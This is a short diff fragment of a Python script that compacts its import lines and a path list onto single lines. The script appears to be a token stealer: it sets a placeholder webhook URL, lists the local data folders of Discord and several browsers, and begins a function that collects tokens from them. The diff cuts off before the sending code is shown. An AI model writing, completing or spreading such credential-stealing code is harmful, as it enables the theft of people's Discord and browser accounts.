@@ -1,18 +1,9 @@
-import requests, os, glob, re, time, getpass, platform, datetime
-from os import remove
-from sys import argv
+import requests, os, glob, re, time, getpass, platform, datetime; from os import remove; from sys import argv
 
 WEBHOOK = "yourWebhookURL"
 
 appdatapath = os.getenv('APPDATA')
-paths = [
-   appdatapath + '\\Discord',
-   appdatapath + '\\discordcanary',
-   appdatapath + '\\discordptb',
-   appdatapath + '\\Google\\Chrome\\User Data\\Default',
-   appdatapath + '\\Opera Software\\Opera Stable',
-   appdatapath + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-   appdatapath + '\\Yandex\\YandexBrowser\\User Data\\Default']
+paths = [appdatapath + '\\Discord', appdatapath + '\\discordcanary', appdatapath + '\\discordptb', appdatapath + '\\Google\\Chrome\\User Data\\Default', appdatapath + '\\Opera Software\\Opera Stable', appdatapath + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', appdatapath + '\\Yandex\\YandexBrowser\\User Data\\Default']
 tknpaths = []
 def getTokens(path):
 	tokns = []
